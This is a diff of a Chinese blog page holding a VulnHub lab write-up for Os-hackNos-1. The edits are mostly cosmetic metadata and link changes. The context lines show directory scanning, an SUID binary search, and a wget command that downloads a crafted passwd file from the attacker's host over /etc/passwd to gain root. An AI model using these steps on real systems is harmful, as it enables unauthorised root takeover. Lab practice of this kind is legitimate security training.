@@ -515,14 +515,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-10
+                    2022-11-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    750
+                    748
                 </div>
                 
 
@@ -550,7 +550,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr>
-<p>难度：简单到中级<br>标志 ： 2 标记第一个用户和第二个根<br>学习：利用|网络应用程序|枚举|权限提升<br>网站 ： <a target="_blank" rel="noopener" href="http://www.hacknos.com/">www.hackNos.com</a><br>邮件 ：<a href="mailto:contact@hackNos.com">contact@hackNos.com</a></p>
+<p>难度：简单到中级<br>flag ： 2个flag 第一个用户和第二个root<br>学习：利用|网络应用程序|枚举|权限提升<br>网站 ： <a target="_blank" rel="noopener" href="http://www.hacknos.com/">www.hackNos.com</a><br>邮件 ：<a href="mailto:contact@hackNos.com">contact@hackNos.com</a></p>
 <hr>
 <h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr>
 <p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
@@ -563,7 +563,7 @@
 <p>发现开放了 22 和 80 端口，访问80端口，发现是一个ubuntu的默认静态页面，尝试访问robots.txt文件未果。。。</p>
 <h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.43.55</code></p>
 <p>发现 <a target="_blank" rel="noopener" href="http://192.168.43.55/drupal/">http://192.168.43.55/drupal/</a> 页面，尝试弱口令登陆，失败；继续进行目录扫描</p>
-<p><img src="https://cdnjson.com/images/2022/11/10/4.png" alt="image"></p>
+<p><img src="https://cdnjson.com/images/2022/11/10/4.png" alt="登陆页面"></p>
 <blockquote>
 <p>Drupal：是开源CMS之一，Drupal是CMS内容管理系统</p>
 </blockquote>
@@ -597,7 +597,7 @@
 <hr>
 <h3 id="0x004-权限提升"><a href="#0x004-权限提升" class="headerlink" title="0x004 权限提升"></a>0x004 权限提升</h3><hr>
 <p>查看网站根目录，发现 alexander.txt 文件，查看文件内容，发现是一些密文，使用 base64解密后，发现还有一层加密，使用 <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 成功解密，发现是账号密码。</p>
-<p><img src="https://cdnjson.com/images/2022/11/10/11.png" alt="base64解密"><br><img src="https://cdnjson.com/images/2022/11/10/9.png" alt="image"></p>
+<p><img src="https://cdnjson.com/images/2022/11/10/11.png" alt="base64解密"><br><img src="https://cdnjson.com/images/2022/11/10/9.png" alt="解密"></p>
 <p>前面扫描到了22端口，现在又得到了账号和密码，感觉起飞了，然后ssh远程登陆，提示拒绝登陆；此路不通，重新找提权点。</p>
 <p>尝试使用suid权限提权</p>
 <p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
@@ -608,7 +608,7 @@
 <p>然后使用wget命令远程下载替换</p>
 <p><code>wget http://192.168.43.253/passwd -O /etc/passwd</code></p>
 <p>查看passwd文件，发现替换成功</p>
-<p><img src="https://cdnjson.com/images/2022/11/10/13.png" alt="image"></p>
+<p><img src="https://cdnjson.com/images/2022/11/10/13.png" alt="passwd文件"></p>
 <p><code>su test</code></p>
 <p>提权成功</p>
 <hr>
@@ -992,17 +992,16 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/10/toc-heading-11/">
+                <a href="/2022/11/11/toc-heading-12/">
                     <div class="card-image">
                         
-                        <img src="https://cdnjson.com/images/2022/11/10/4.png" class="responsive-img" alt="vulnhub靶场Os-hackNos-1">
+                        <img src="https://cdnjson.com/images/2022/11/11/8.png" class="responsive-img" alt="vulnhub靶场Os-hackNos-2">
                         
-                        <span class="card-title">vulnhub靶场Os-hackNos-1</span>
+                        <span class="card-title">vulnhub靶场Os-hackNos-2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1012,9 +1011,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-10
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-11
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1027,7 +1026,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1369,7 +1367,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">38k</span>&nbsp;字
+                class="white-color">38.4k</span>&nbsp;字
             
             
             
